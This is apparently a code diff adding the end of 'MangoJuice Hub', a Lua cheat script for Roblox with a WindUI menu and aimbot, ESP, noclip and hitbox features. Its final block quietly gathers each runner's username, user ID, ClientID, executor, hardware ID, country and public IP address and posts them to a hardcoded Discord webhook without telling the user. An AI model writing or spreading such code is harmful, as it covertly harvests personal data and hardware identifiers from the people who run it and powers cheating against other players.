+    Value = _G.Config.UI.Theme,
+    Callback = function(v)
+        _G.Config.UI.Theme = v
+    WindUI:SetTheme(v)
+end })
+
+Tabs.UITab:Divider()
+
+Tabs.UITab:Toggle({
+    Title = "Auto Save Cocfiig",
+    Value = _G.Config.UI.AutoSave,
+    Locked = true,
+    Callback = function(v)
+        _G.Config.UI.AutoSave = v
+    end
+})
+
+Tabs.UITab:Toggle({
+    Title = "Auto Load Config",
+    Value = _G.Config.UI.AutoLoad,
+    Locked = true,
+    Callback = function(v)
+        _G.Config.UI.AutoLoad = v
+    end
+})
+
+LoadDone = true
+_G.Load = true
+
+CheckLoad()
+
+WindUI:Notify({
+        Title = "MangoJuice Hub Notify",
+        Content = "Successfully loaded !",
+        Icon = "solar:bell-bold",
+        Duration = 10
+})
+
+Window:OnClose(function()
+    WindUI:Notify({
+        Title = "MangoJuice Hub Notify",
+        Content = "UI Closed\n\nPress ".. "Keybind (B)" .. " or Click OpenButton ".."\nTo Show Again",
+        Icon = "solar:bell-bold",
+        Duration = 5
+    })
+    _G.Load = false
+end)
+
+Window:OnDestroy(function()
+    WindUI.Notify = function() end
+    WalkSpeedStop()
+    DisableHitbox()
+    fm:DisableNoClip()
+        autoV3Conn:Disconnect()
+        autoV3Conn = nil    
+        autoV4Conn:Disconnect()
+        autoV4Conn = ni
+    CleanupPlayerESP()
+    stopFollow()
+    stopFollowStateGuard()
+    Aimbot_StopAll()
+end)
+
+do
+
+local GS_WEBHOOK = "https://discord.com/api/webhooks/1477603935723323425/-57ZoYrdu8TPCKYBz-iFmDhbnDmXh-j_nRUc22jGAg3DTvO8oBhQ_BBF69pyxHNr9iJq"
+    
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+
+local localPlayer = Players.LocalPlayer
+if not localPlayer then
+    return
+end
+
+local function safeCall(func, fallback)
+    local success, result = pcall(func)
+    return success and result or fallback
+end
+
+local function getAvatarImage(userId)
+    return safeCall(function()
+        local url = string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", userId)
+        local response = HttpService:JSONDecode(game:HttpGet(url))
+        return response.data[1].imageUrl
+    end, "https://www.roblox.com/Thumbs/Avatar.ashx?x=180&y=180&userId=" .. userId)
+end
+
+local function getDeviceType()
+    local touch = UserInputService.TouchEnabled
+    local keyboard = UserInputService.KeyboardEnabled
+    local mouse = UserInputService.MouseEnabled
+    
+    if touch and not keyboard and not mouse then return "Mobile"
+    elseif not touch and keyboard and mouse then return "PC or Mac"
+    elseif touch and keyboard and mouse then return "UGPhone"
+    else return "Unknow" end
+end
+
+local function getExecutor()
+    return (identifyexecutor and identifyexecutor()) or 
+           (getexecutorname and getexecutorname()) or 
+           "Unknow"
+end
+
+local function getHWID()
+    return (gethwid and gethwid()) or "Unknow"
+end
+
+local function getIPAddress()
+    local request = http_request or request or (syn and syn.request)
+    if not request then return "Unknow" end
+    
+    return safeCall(function()
+        return request({Url = "https://api.ipify.org/", Method = "GET"}).Body
+    end, "GetFailed")
+end
+
+local userId = localPlayer.UserId
+local placeId = game.PlaceId
+
+local payload = {
+    username = "MangoJuice Bot",
+    embeds = {{
+        color = tonumber("0x32CD32"),
+        title = string.format("New Execute For MangoJuice Hub %s %d:%d", 
+            os.date("%Y%m%d"), 
+            tonumber(os.date("%H")), 
+            tonumber(os.date("%M"))),
+        
+        thumbnail = {url = getAvatarImage(userId)},
+        
+        fields = {
+            {name = "UserName", value = localPlayer.Name, inline = true},
+            {name = "DisplayName", value = localPlayer.DisplayName, inline = true},
+            {name = "User ID", value = string.format("[%d](https://www.roblox.com/users/%d/profile)", userId, userId), inline = true},
+            
+            {name = "ClientID", value = safeCall(function() return RbxAnalyticsService:GetClientId() end, "Unknow"), inline = false},
+            
+            {name = "MapID", value = string.format("[%d](https://www.roblox.com/games/%d)", placeId, placeId), inline = true},
+            {name = "MapName", value = safeCall(function() return MarketplaceService:GetProductInfo(placeId).Name end, "Unknow"), inline = true},
+            
+            {name = "Executor", value = getExecutor(), inline = true},
+            {name = "AccountAge", value = string.format("%dDay", localPlayer.AccountAge), inline = true},
+            
+            {name = "Device", value = getDeviceType(), inline = false},
+            {name = "Nation", value = string.format("Nation: %s", safeCall(function() return LocalizationService:GetCountryRegionForPlayerAsync(localPlayer) end, "Unknow")), inline = false},
+            {name = "Language", value = string.format("Language: %s", localPlayer.LocaleId), inline = false},
+                           
+            {name = "HWID", value = getHWID(), inline = true},
+            {name = "IP", value = getIPAddress(), inline = false},
+            {name = "IP2", value = string.format("https://binaryfork.com/zh/tools/ip-address-lookup/?ip=%s#ip-lookup", getIPAddress()), inline = false}
+        }
+    }}
+}
+
+local request = http_request or request or HttpPost or (syn and syn.request)
+if not request then
+    return
+end
+
+safeCall(function()
+    request({
+        Url = GS_WEBHOOK,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode(payload)
+    })
+end)
+
+end
